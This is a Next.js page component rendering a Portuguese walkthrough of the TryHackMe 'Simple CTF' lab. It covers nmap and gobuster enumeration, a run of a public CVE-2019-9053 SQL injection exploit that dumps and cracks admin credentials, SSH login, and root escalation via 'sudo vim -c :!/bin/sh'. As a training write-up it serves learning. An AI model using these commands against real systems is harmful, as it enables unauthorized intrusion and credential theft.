import { Metadata } from "next"
import { ScrollAnimation } from "@/components/ScrollAnimation";

export const metadata: Metadata = {
  title: "TryHackMe - Simple CTF | fe1ps",
  description: "Walkthrough da máquina Simple CTF do TryHackMe, explorando a CVE-2019-9053 (SQLi) no CMS Made Simple e escalando privilégios com sudo vim.",
}

// --- Componentes de Estilo ---

const CodeBlock = ({ children }: { children: React.ReactNode }) => (
  <pre className="bg-gray-900/50 p-4 rounded-md overflow-x-auto text-sm text-white/90 font-mono">
    <code>{children}</code>
  </pre>
);

const InlineCode = ({ children }: { children: React.ReactNode }) => (
  <code className="bg-gray-700/50 text-orange-300 py-1 px-1.5 rounded-md text-sm font-mono">
    {children}
  </code>
);

const InfoBlock = ({ children }: { children: React.ReactNode }) => (
    <div className="bg-blue-900/30 border-l-4 border-blue-400 p-4 rounded-md my-4">
        {children}
    </div>
);

const SummaryBlock = ({ children }: { children: React.ReactNode }) => (
    <div className="bg-gray-800/50 border-l-4 border-gray-500 p-4 rounded-md my-4">
        {children}
    </div>
);

const WarningBlock = ({ children }: { children: React.ReactNode }) => (
    <div className="bg-yellow-900/30 border-l-4 border-yellow-400 p-4 rounded-md my-4">
        {children}
    </div>
);

const SuccessBlock = ({ children }: { children: React.ReactNode }) => (
    <div className="bg-green-900/30 border-l-4 border-green-400 p-4 rounded-md my-4">
        {children}
    </div>
);


// --- Componente Principal do Artigo ---

export default function SimpleCtfArticle() {
  return (
    <div className="py-12">
      <div className="container mx-auto px-4">
        <ScrollAnimation>
          <h1 className="text-4xl font-bold pt-4 mt-4 border-t border-white/30">TryHackMe - Simple CTF</h1>
        </ScrollAnimation>
        
        <div className="space-y-12">
            
          <ScrollAnimation delay={200}>
            <InfoBlock>
                <p><strong>Resumo da Máquina</strong></p>
                <p><strong>IP:</strong> <InlineCode>10.201.34.55</InlineCode></p>
                <p><strong>SO:</strong> Ubuntu Linux</p>
                <p><strong>Vetor de Ataque:</strong> SQL Injection no CMS Made Simple (CVE-2019-9053) para obter credenciais, seguido de escalação de privilégios via <InlineCode>sudo vim</InlineCode>.</p>
            </InfoBlock>
          </ScrollAnimation>

          <ScrollAnimation delay={300}>
            <p className="text-gray-400">
                <strong>Tags:</strong> <InlineCode>#ctf</InlineCode> <InlineCode>#walkthrough</InlineCode> <InlineCode>#nmap</InlineCode> <InlineCode>#sqli</InlineCode> <InlineCode>#cve</InlineCode> <InlineCode>#vim</InlineCode> <InlineCode>#privesc</InlineCode>
            </p>
          </ScrollAnimation>

          <ScrollAnimation delay={200}>
            <section>
              <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">1. Reconhecimento e Enumeração</h2>
              <p className="mt-4 text-gray-300">
                O reconhecimento inicial revelou um firewall que filtra a maioria das portas. Foi necessário um escaneamento mais robusto para identificar os serviços em execução.
              </p>
              <h3 className="text-xl font-semibold mt-4">1.1. Varredura com Nmap</h3>
              <p className="mt-2 text-gray-300">Após tentativas iniciais com resultados filtrados, utilizei um escaneamento Nmap mais completo para garantir a descoberta dos serviços. Os parâmetros <InlineCode>-sC</InlineCode> (scripts padrão), <InlineCode>-sV</InlineCode> (versões) e <InlineCode>-Pn</InlineCode> (ignorar descoberta de host) foram essenciais.</p>
              <CodeBlock>nmap -T4 -sC -sV -Pn -oN nmap/initial 10.201.34.55</CodeBlock>
              <p className="mt-2 text-gray-300"><strong>Resultado:</strong></p>
              <CodeBlock>{`Nmap scan report for 10.201.34.55\nHost is up (0.29s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_Can't get directory listing: TIMEOUT\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n| http-robots.txt: 2 disallowed entries \n|_/ /openemr-5_0_1_3 \n2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)\n|_  ...\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel`}</CodeBlock>
              <SummaryBlock>
                  <p><strong>Pontos de Interesse Encontrados:</strong></p>
                  <ul className="list-disc list-inside mt-2">
                      <li><strong>Porta 21:</strong> FTP (<InlineCode>vsftpd 3.0.3</InlineCode>) com login anônimo habilitado.</li>
                      <li><strong>Porta 80:</strong> HTTP (<InlineCode>Apache httpd 2.4.18</InlineCode>).</li>
                      <li><strong>Porta 2222:</strong> SSH (<InlineCode>OpenSSH 7.2p2</InlineCode>) - A porta de serviço mais alta.</li>
                  </ul>
              </SummaryBlock>

              <h3 className="text-xl font-semibold mt-4">1.2. Enumeração de Diretórios Web</h3>
              <p className="mt-2 text-gray-300">Para explorar o servidor web, usei o <strong>GoBuster</strong> para encontrar diretórios ocultos.</p>
              <CodeBlock>gobuster dir -u http://10.201.34.55 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</CodeBlock>
              <p className="mt-4 text-gray-300">O resultado mais relevante foi o diretório <InlineCode>/simple</InlineCode>.</p>
            </section>
          </ScrollAnimation>

          <ScrollAnimation delay={200}>
            <section>
              <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">2. Exploração (SQL Injection)</h2>
              <h3 className="text-xl font-semibold mt-4">2.1. Identificação da Vulnerabilidade</h3>
              <p className="mt-2 text-gray-300">Ao acessar <InlineCode>http://10.201.34.55/simple</InlineCode>, o rodapé da página revelou a tecnologia e a versão em uso: <strong>CMS Made Simple version 2.2.8</strong>.</p>
              <p className="mt-2 text-gray-300">Uma rápida pesquisa por essa versão levou à descoberta de uma vulnerabilidade de <strong>SQL Injection não autenticada</strong>, registrada como <strong><a href="https://www.exploit-db.com/exploits/46635" target="_blank" rel="noopener noreferrer" className="text-sky-400 hover:underline">CVE-2019-9053</a></strong>.</p>
              
              <h3 className="text-xl font-semibold mt-4">2.2. Execução do Exploit</h3>
              <p className="mt-2 text-gray-300">Encontrei um script de exploração funcional no <a href="https://github.com/so1icitx/CVE-2019-9053" target="_blank" rel="noopener noreferrer" className="text-sky-400 hover:underline">GitHub (so1icitx/CVE-2019-9053)</a>. O script permite extrair o hash da senha do administrador e, em seguida, quebrá-lo usando uma wordlist.</p>
              <CodeBlock>python3 exploit.py -u http://10.201.34.55/simple --crack -w /usr/share/wordlists/rockyou.txt</CodeBlock>
              <p className="mt-2 text-gray-300"><strong>Resultado do Exploit:</strong></p>
              <CodeBlock>{`[+] Username found: mitch\n[+] Email found: admin@admin.com\n[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96\n[+] Password cracked: secret`}</CodeBlock>
              <p className="mt-4 text-gray-300">As credenciais obtidas foram <InlineCode>mitch</InlineCode>:<InlineCode>secret</InlineCode>.</p>
            </section>
          </ScrollAnimation>

          <ScrollAnimation delay={200}>
            <section>
              <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">3. Acesso Inicial e Enumeração Interna</h2>
              <p className="mt-4 text-gray-300">Com as credenciais em mãos, o próximo passo foi acessar a máquina via SSH na porta <InlineCode>2222</InlineCode>.</p>
              <h3 className="text-xl font-semibold mt-4">3.1. Conexão SSH</h3>
              <CodeBlock>ssh mitch@10.201.34.55 -p 2222</CodeBlock>
              
              <h3 className="text-xl font-semibold mt-4">3.2. Capturando a Flag do Usuário</h3>
              <p className="mt-2 text-gray-300">Após o login, a flag do usuário estava no diretório home.</p>
              <CodeBlock>{`$ ls\nuser.txt\n$ cat user.txt`}</CodeBlock>
              <SuccessBlock>
                  <strong>user.txt:</strong> <InlineCode>...user_flag...</InlineCode>
              </SuccessBlock>

              <h3 className="text-xl font-semibold mt-4">3.3. Enumeração de Usuários</h3>
              <p className="mt-2 text-gray-300">Verifiquei o diretório <InlineCode>/home</InlineCode> e encontrei outro usuário na máquina.</p>
              <CodeBlock>{`$ pwd\n/home/mitch\n$ cd ..\n$ ls\nmitch  sunbath`}</CodeBlock>
              <p className="mt-4 text-gray-300">O outro usuário é o <strong>sunbath</strong>.</p>
            </section>
          </ScrollAnimation>

          <ScrollAnimation delay={200}>
            <section>
              <h2 className="text-2xl font-bold pt-4 mt-4 border-t border-white/30">4. Escalação de Privilégios</h2>
              <p className="mt-4 text-gray-300">Para obter acesso root, verifiquei as permissões de <InlineCode>sudo</InlineCode> do usuário <InlineCode>mitch</InlineCode>.</p>
              <h3 className="text-xl font-semibold mt-4">4.1. Identificando o Vetor</h3>
              <p className="mt-2 text-gray-300">O comando <InlineCode>sudo -l</InlineCode> revela o que um usuário pode executar como superusuário.</p>
              <CodeBlock>$ sudo -l</CodeBlock>
              <WarningBlock>
                  <p><strong>Vetor Encontrado:</strong> O usuário <InlineCode>mitch</InlineCode> pode executar o editor de texto <strong>Vim</strong> como <InlineCode>root</InlineCode> e sem precisar de senha (<InlineCode>NOPASSWD</InlineCode>).</p>
              </WarningBlock>
              
              <h3 className="text-xl font-semibold mt-4">4.2. Obtendo um Shell Root</h3>
              <p className="mt-2 text-gray-300">O <strong>Vim</strong> pode ser usado para executar comandos do sistema. O site <a href="https://gtfobins.github.io/gtfobins/vim/#sudo" target="_blank" rel="noopener noreferrer" className="text-sky-400 hover:underline">GTFOBins</a> mostra como explorar essa permissão para obter um shell.</p>
              <p className="mt-2 text-gray-300">Executei o seguinte comando para abrir um shell como root a partir do Vim:</p>
              <CodeBlock>$ sudo vim -c ':!/bin/sh'</CodeBlock>
              <p className="mt-4 text-gray-300">Isso me deu um shell com privilégios de root.</p>
              <CodeBlock>{`id\nuid=0(root) gid=0(root) groups=0(root)`}</CodeBlock>

              <h3 className="text-xl font-semibold mt-4">4.3. Capturando a Flag Root</h3>
              <p className="mt-2 text-gray-300">Finalmente, naveguei até o diretório <InlineCode>/root</InlineCode> para encontrar a última flag.</p>
              <CodeBlock>{`cd /root\nls\nroot.txt\ncat root.txt`}</CodeBlock>
              <SuccessBlock>
                  <strong>root.txt:</strong> <InlineCode>...root_flag...!</InlineCode>
              </SuccessBlock>
            </section>
          </ScrollAnimation>
        </div>
      </div>
    </div>
  )
}